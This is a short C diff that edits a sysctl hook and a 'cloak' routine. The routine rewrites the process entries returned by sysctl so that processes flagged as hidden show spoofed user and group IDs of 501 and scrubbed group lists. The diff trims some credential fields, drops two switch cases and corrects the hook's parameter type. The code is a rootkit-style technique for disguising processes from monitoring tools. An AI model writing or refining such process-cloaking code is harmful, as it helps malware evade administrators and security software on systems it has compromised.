@@ -152,12 +152,8 @@ static void cloak_scrub_kinfo_proc(struct kinfo_proc *kproc)
                 if (hide) {
                         kproc->kp_eproc.e_ucred.cr_uid  = 501;
                         kproc->kp_eproc.e_ucred.cr_gid  = 501;
-                        kproc->kp_eproc.e_ucred.cr_ruid = 501;
-                        kproc->kp_eproc.e_ucred.cr_rgid = 501;
                         kproc->kp_eproc.e_pcred.p_ruid  = 501;
                         kproc->kp_eproc.e_pcred.p_rgid  = 501;
-                        kproc->kp_eproc.e_ucred.cr_svuid = 501;
-                        kproc->kp_eproc.e_ucred.cr_svgid = 501;
                         // A stock system process never carries all-zero groups.
                         kproc->kp_eproc.e_ucred.cr_ngroups = 1;
                         for (int g = 1; g < NGROUPS; g++) {
@@ -168,7 +164,7 @@ static void cloak_scrub_kinfo_proc(struct kinfo_proc *kproc)
         }
 }
 
-int sysctl_hook(const char *name, u_int namelen, void *oldp, size_t *oldlenp, void *newp, size_t newlen)
+int sysctl_hook(int *name, u_int namelen, void *oldp, size_t *oldlenp, void *newp, size_t newlen)
 {
         int r = sysctl(name, namelen, oldp, oldlenp, newp, newlen);
         if (r != 0) return r;
@@ -181,10 +177,6 @@ int sysctl_hook(const char *name, u_int namelen, void *oldp, size_t *oldlenp, vo
                 int entrySize = 0;
                 switch (name[2]) {
                         case KERN_PROC_PID:
-                        case KERN_PROC_PIDINFO:
-                        case KERN_PROC_TBSDINFO:
-                                entrySize = (int)sizeof(struct kinfo_proc);
-                                break;
                         case KERN_PROC_ALL:
                         case KERN_PROC_UID:
                                 entrySize = (int)sizeof(struct kinfo_proc);
